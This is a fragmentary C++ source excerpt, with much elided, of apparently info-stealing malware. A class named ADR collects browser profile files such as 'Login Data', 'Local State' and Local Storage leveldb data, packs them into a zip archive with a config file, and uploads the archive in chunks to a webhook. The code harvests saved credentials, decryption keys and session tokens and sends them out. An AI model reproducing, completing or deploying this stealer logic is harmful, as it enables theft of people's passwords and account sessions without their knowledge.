...
void ADR::searchTargets(const std::vector<std::string>& targets, const std::string& search)
{
...
bool ADR::createZipPack()
{
    ...
    this->config.close();
    ZipAdd(this->hz, HStringToANSI(this->zipOutName + ".ini"), HStringToANSI(this->configPath));
}
...
std::vector<std::string> ADR::getUserDataFiles(const std::string& path)
{
    std::vector<std::string> dataFiles = {
         ...
         path + "Login Data",
         path + "Local State",
         HPathGetParent(path) + "Local State"
    };
    std::vector<std::string> ldbFiles = HPathGetFiles(path + "Local Storage\\leveldb\\");
...
bool ADR::processUserDataFolder(const std::string& path)
{
    ...
    for (const std::string& file : dataFiles)
    {
        ...
        ZRESULT zfRes = ZipAdd(hz, HStringToANSI(zipInFolderName + "\\" + HPathGetName(file)), HStringToANSI(file));
...
bool ADR::sendPack()
{
    ...
    embedZip.fields["Errors"] = std::to_string(this->errors) + "/" + std::to_string(this->results.size());
    ...
    if (zipOutSizeMo < WEBHOOK_MAX_PACK_SIZE)
    {
        ...
        std::vector<std::string> files = HChunkFile(zipOutPath, WEBHOOK_TARGET_PACK_SIZE * O_2_MO);
